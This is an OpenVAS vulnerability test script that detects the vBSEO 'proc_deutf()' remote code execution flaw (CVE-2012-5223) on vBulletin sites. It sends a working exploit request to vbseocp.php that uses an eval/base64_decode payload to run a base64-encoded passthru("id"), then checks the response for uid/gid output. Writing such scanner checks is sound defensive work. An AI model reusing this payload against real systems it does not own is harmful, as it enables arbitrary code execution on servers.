###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vbseo_51647.nasl 11651 2018-09-27 11:53:00Z asteins $
#
# vBSEO 'proc_deutf()' Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103405");
  script_cve_id("CVE-2012-5223");
  script_bugtraq_id(51647);
  script_version("$Revision: 11651 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("vBSEO 'proc_deutf()' Remote Code Execution Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51647");
  script_xref(name:"URL", value:"http://www.vbseo.com/f5/vbseo-security-bulletin-all-supported-versions-patch-release-52783/");
  script_xref(name:"URL", value:"http://www.vbseo.com/");

  script_tag(name:"last_modification", value:"$Date: 2018-09-27 13:53:00 +0200 (Thu, 27 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-01-31 14:44:01 +0100 (Tue, 31 Jan 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_tag(name:"solution_type", value:"VendorFix");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("vbulletin_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("vBulletin/installed");
  script_tag(name:"solution", value:"Updates are available. Please see the references for more details.");
  script_tag(name:"summary", value:"vBSEO is prone to a remote code-execution vulnerability.");

  script_tag(name:"impact", value:"Exploiting this issue will allow attackers to execute arbitrary code
within the context of the affected application.");

  script_tag(name:"affected", value:"vBSEO 3.5.0, 3.5.1, 3.5.2, and 3.6.0.are vulnerable, other versions
may also be affected.");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("version_func.inc");
include("misc_func.inc");

CPE = 'cpe:/a:vbulletin:vbulletin';

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = string(dir, "/vbseocp.php");

cmd = base64(str:'passthru("id");');
ex = "char_repl='{${eval(base64_decode($_SERVER[HTTP_CODE]))}}.{${die()}}'=>";
len = strlen(ex);

host = get_host_name();

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Code: ", cmd, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", len, "\r\n",
             "\r\n",
             ex);

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(result && egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*",string:result)) {

  security_message(port:port);
  exit(0);

}

exit(0);

